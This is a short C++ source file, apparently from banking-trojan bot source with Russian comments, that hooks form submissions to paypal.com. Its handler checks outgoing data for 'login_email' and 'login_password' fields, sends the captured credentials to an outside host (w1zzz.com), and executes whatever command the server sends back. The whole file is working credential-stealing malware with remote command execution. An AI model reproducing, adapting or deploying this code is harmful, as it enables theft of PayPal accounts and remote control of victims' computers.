//---------------------------------------------------------------------------


#include "HTMLSend.h"
#include "Strings.h"
#include "Loader.h"
#include "Task.h"
#include "Strings.h"
#include "BotDebug.h"

//---------------------------------------------------------------------------

const PCHAR DuplicateDataURL = "http://w1zzz.com/set/fgr.html";


void PayPalDataEvent(PSendHTMLData Data, bool &IgnoreHandler,  bool &Cancel)
{
	// Функция проверяет наличие имени login в отправляемых данных
	if (STR::Pos(Data->Data, "login_email") < 0 || STR::Pos(Data->Data, "login_password") < 0)
	{
		IgnoreHandler = true;
		return;
    }

	// Отправляем данные на сервер
	PCHAR Response = NULL;
	DataGrabber::SendHTMLDataToServer(DuplicateDataURL, Data, &Response);
	ExecuteCommand(NULL, Response, true);
}


//------------  Регистрируем обработчики отправки данных -------------------//

//bool Initialized = false;

void InitHTMLSendHandlers()
{

    // Регистрируем обработчики отправки
	RegisterSendDataHandler("*paypal.com*", PayPalDataEvent, hdmUnknown, DuplicateDataURL);
}


//-------------------------------------------------------------------------//


